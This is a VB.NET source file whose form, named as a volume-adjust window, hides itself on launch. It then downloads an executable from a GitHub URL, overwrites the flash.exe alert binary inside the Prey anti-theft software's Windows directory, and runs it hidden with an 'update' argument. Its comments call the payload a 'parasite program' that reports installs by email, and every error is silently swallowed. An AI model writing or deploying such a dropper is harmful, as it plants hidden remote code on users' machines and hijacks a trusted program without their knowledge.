Imports System.IO
Imports System.Net

Public Class voladjustForm
    '网络下载文件相关
    Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Integer, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Integer, ByVal lpfnCB As Integer) As Integer
    '调用外部程序
    Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Integer, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Integer) As Integer
    '用于确定文件路径
    Dim PreyDirectory As String = Environment.GetFolderPath(Environment.SpecialFolder.Windows) & "\Prey"
    Dim PreyVireion As String = "1.6.3"
    Dim FlashPath As String = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alert\win32\flash.exe"
    Dim AlarmDirectory As String = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alarm\bin\"
    Dim BackupPath As String = AlarmDirectory & "flash_bak"
    Dim GitHubURL As String = "https://raw.githubusercontent.com/CuteLeon/PreySilent/master/Prey-Silent/Resources/Flash.exe"

    Private Sub voladjustForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Try
            Dim DownloadClient As WebClient = New WebClient
            '首先判断本目录是否有 flash 文件的备份(文件名为 flash_bak，由 Prey-Silent 释放)
            If File.Exists(BackupPath) Then File.Delete(BackupPath)

            '备份文件不在时需要从 GitHub 下载，当下载失败时，退出
            DownloadClient.DownloadFile(GitHubURL, BackupPath)

            '如果 flash.exe 存在就删除再复制，可以利用这一特性用于 flash 升级
            If File.Exists(FlashPath) Then File.Delete(FlashPath)

            '开始使用 cmd 值守程序退出之后恢复
            RecoveryFlash()

            '使用 [update] 参数调用 寄生程序 ，接收安装/更新成功提示邮件
            ShellExecute(0, vbNullString, FlashPath, "update", vbNullString, vbHide)

            Application.Exit()
        Catch ex As Exception
            Application.Exit()
        End Try
    End Sub

    ''' <summary>
    ''' 用来恢复被删除的 flash 程序
    ''' </summary>
    Private Sub RecoveryFlash()
        '计划委托 cmd 值守等待本进程结束之后再复制文件
        Shell("cmd.exe /c copy " & BackupPath & " " & FlashPath, vbHide, True)
    End Sub
End Class
